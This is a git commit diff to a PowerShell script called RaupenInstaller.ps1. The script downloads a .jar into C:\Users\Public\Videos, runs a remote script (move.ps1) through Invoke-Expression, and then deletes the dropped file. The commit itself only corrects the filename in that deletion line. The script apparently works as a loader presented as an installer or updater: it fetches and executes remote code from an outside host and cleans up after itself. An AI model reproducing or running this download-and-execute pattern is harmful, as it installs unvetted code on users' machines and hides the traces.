4741c68cd9134892636d3a392a2d4feb8f6f2329
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-23 19:20:12 +0100

    Update RaupenInstaller.ps1

--- RaupenInstaller.ps1
+++ RaupenInstaller.ps1
@@ -1,4 +1,4 @@
 Invoke-WebRequest https://github.com/RaupenInspektor/Updates/raw/main/executeupdate.jar -OutFile C:\Users\Public\Videos\executeupdate.jar -UseBasicParsing
 Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/Updates/raw/main/move.ps1" -UseBasicParsing).Content
 
-Remove-Item -Path C:\Users\Public\Videos\executeupdate.ps1 -Force
+Remove-Item -Path C:\Users\Public\Videos\executeupdate.jar -Force
